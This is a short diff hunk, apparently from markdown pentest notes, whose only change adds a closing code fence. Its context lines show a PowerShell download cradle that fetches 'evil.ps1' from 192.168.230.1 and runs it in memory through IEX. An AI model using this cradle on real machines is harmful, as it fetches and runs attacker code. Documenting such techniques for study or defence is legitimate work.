@@ -29,7 +29,7 @@ $h.responseText
 $wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
 $r = $wr.GetResponse()
 IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
-
+```
 
 
 
